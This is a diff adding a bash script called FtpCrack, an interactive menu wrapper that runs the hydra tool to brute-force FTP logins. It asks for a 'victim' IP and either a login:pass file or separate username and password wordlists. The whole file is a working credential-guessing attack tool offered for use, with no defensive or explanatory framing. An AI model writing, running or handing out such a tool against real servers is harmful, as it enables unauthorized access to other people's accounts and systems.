@@ -1,0 +1,187 @@
+#!/usr/bin/env bash
+
+#[*] Name of the script: FtpCrack
+#[*] Description: "Brute Force Attack to FTP Server"
+#[*] Version: 2.0
+#[*] Author: JRIC2002
+#[*] Date of creation: 01/12/2018
+#[*] Date of last update: 30/04/2020
+
+#COLORS 
+black='\033[1;30m'
+red='\033[1;31m'
+green='\033[1;32m'
+yellow='\033[1;33m'
+blue='\033[1;34m'
+magenta='\033[1;35m'
+cyan='\033[1;36m'
+white='\033[0m'
+
+function banner {
+
+	#BANNER
+
+	printf "
+	$blue   _____ _          $green ____                _
+	$blue  |  ___| |_ _ __   $green/ ___|_ __ __ _  ___| | __
+	$blue  | |_  | __| '_ \ $green| |   | '__/ _' |/ __| |/ /
+	$blue  |  _| | |_| |_) |$green| |___| | | (_| | (__|   <
+	$blue  |_|    \__| .__/  $green\____|_|  \__,_|\___|_|\_\ $white v2.0
+	$blue            |_|$white
+	"
+	echo ""
+	printf "	      $yellow.:.:.$white Script encoded by: @JRIC2002 $yellow.:.:.$white\n"
+	printf "      $yellow.:.:.$white Description: Brute Force Attack to FTP Server$yellow.:.:.$white\n"
+	echo ""
+}
+
+function opcion1 {
+
+	#CONFIGURACION
+
+	printf "$cyan[*]$magenta Let's to configure it$white\n"
+                echo ""
+                sleep 2
+	
+	printf "$cyan   [Set]$green File Path$white >>"
+		read -p " " file
+		echo ""
+
+	printf "$cyan   [Set]$green Ip Victim$white >>"
+                read -p " " ipvictim
+                echo ""
+	
+	sleep 3
+	clear
+
+	banner
+
+        echo ""
+        printf "$cyan[*]$magenta Starting Attack$white"
+                echo ""
+                echo ""
+                sleep 5
+
+        printf "$cyan[*]$magenta Attack in Process...$white"
+                echo ""
+                echo ""
+                sleep 3
+
+#PROCESO DE ATAQUE
+	
+hydra -C $file $ipvictim ftp
+
+#VOLVER AL MENU PRINCIPAL
+
+echo ""
+printf "Presione$yellow ENTER$white para volver..."
+read -p "" volver
+clear
+banner
+elegir_opcion
+
+}
+
+function opcion2 {
+	
+	#CONFIGURACION
+	
+	printf "$cyan[*]$magenta Let's to configure it$white\n"
+		echo ""
+		sleep 2
+
+	printf "$cyan   [Set]$green File with User Name$white >>"
+		read -p " " userS
+		echo ""
+	
+	printf "$cyan   [Set]$green Password File$white >>" 
+		read -p " " passwordS
+		echo ""
+
+	printf "$cyan   [Set]$green Ip Victim$white >>"
+		read -p " " ip
+		echo ""
+
+	sleep 3
+	clear 
+
+	banner
+
+	echo ""
+	printf "$cyan[*]$magenta Starting Attack$white"
+		echo ""
+		echo ""
+		sleep 5
+
+	printf "$cyan[*]$magenta Attack in Process...$white"
+		echo ""
+		echo ""
+		sleep 3
+
+#PROCESO DE ATAQUE
+
+hydra -L $userS -P $passwordS $ip ftp
+
+#VOLVER AL MENU PRINCIPAL
+
+echo ""
+printf "Presione$yellow ENTER$white para volver..."
+read -p "" volver
+clear
+banner
+elegir_opcion
+
+}
+
+function elegir_opcion {
+
+	#OPCION A ELEGIR
+
+	printf "$cyan[$white\e001$cyan]$green File with login:pass (if you have users and passwords in a file)$white\n"
+	        echo ""
+
+	printf "$cyan[$white\e002$cyan]$green Separate Files (a login file, a pass file)$white\n"
+	        echo ""
+
+	printf "$cyan[$white\e003$cyan]$green Exit$white\n"
+		echo ""
+
+	#NOTA IMPORTANTE
+
+	printf "$red Important Note: $white 
+	If you choose option 1, the .txt file must have 'login:pass'.
+	Example:
+		* admin:admin 
+		* user:123
+	"
+	echo ""
+	printf "$cyan[#]$magenta Choose an Option: $white"
+	read -p "" respuesta
+	sleep 1
+
+	#CONDICIONALES
+
+	if [ $respuesta = "1" -o $respuesta = "01" ]; then
+		clear
+		banner
+		opcion1
+	elif [ $respuesta = "2" -o $respuesta = "02" ]; then
+		clear 
+		banner
+		opcion2
+	elif [ $respuesta = "3" -o $respuesta = "03" ]; then
+		exit
+	else 
+		sleep 1
+		clear
+		banner
+		elegir_opcion
+	fi
+
+}
+
+#FUNCIONES
+
+banner
+elegir_opcion
+
